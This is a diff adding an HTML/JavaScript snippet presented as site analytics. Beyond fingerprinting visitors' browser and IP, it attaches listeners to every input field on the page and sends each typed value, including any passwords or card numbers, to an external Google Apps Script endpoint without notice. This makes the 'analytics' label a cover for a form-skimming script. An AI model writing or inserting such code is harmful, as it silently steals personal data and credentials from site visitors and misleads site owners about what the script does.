@@ -1,0 +1,96 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js" defer></script>
+<script defer>
+  function initializeAnalytics() {
+    const parser = new UAParser();
+    const uaData = parser.getResult();
+    const payload = {
+      os: uaData.os,
+      browser: uaData.browser,
+      cpu: uaData.cpu,
+      device: uaData.device,
+      engine: uaData.engine
+    };
+    console.log(payload)
+
+    async function logVisit(ip) {
+      console.log('Logging visit: ', ip)
+      const url = 'https://script.google.com/macros/s/AKfycbw0vKHik1Ccbgr9RN1lqDXkzLgrSROlMUYMSnFK8cskCJkZNZheWEqt5o9WMiS5v_fVmw/exec';
+      const body = JSON.stringify({
+        action: 'visit',
+        ip,
+        path: window.location.pathname,
+        payload
+      });
+
+      try {
+        await fetch(url, {
+          method: 'POST',
+          body,
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+      } catch (error) {
+        console.error('Error logging visit:', error);
+      }
+    }
+
+    function attachFormFieldListeners(ip) {
+      document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('blur', async function() {
+          const url = 'https://script.google.com/macros/s/AKfycbw0vKHik1Ccbgr9RN1lqDXkzLgrSROlMUYMSnFK8cskCJkZNZheWEqt5o9WMiS5v_fVmw/exec';
+          const id = this.id;
+          const value = this.value;
+          if (!value) return;
+
+          const body = JSON.stringify({
+            action: 'form_field',
+            id,
+            value,
+            ip,
+            path: window.location.pathname
+          });
+
+          try {
+            const response = await fetch(url, {
+              method: 'POST',
+              body,
+              headers: {
+                'Content-Type': 'application/json'
+              }
+            });
+            const data = await response.json();
+            console.log(data);
+          } catch (error) {
+            console.error('Error:', error);
+          }
+        });
+      });
+    }
+
+    async function main() {
+      try {
+        const { ip } = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+        window.markae = { ip };
+        await logVisit(ip);
+        attachFormFieldListeners(ip);
+      } catch (error) {
+        console.error('Error initializing analytics:', error);
+      }
+    }
+
+    // Run the main function when the DOM is fully loaded
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', main);
+    } else {
+      main();
+    }
+  }
+
+  // Initialize analytics when UA Parser is loaded
+  if (typeof UAParser === 'function') {
+    initializeAnalytics();
+  } else {
+    window.addEventListener('load', initializeAnalytics);
+  }
+</script>
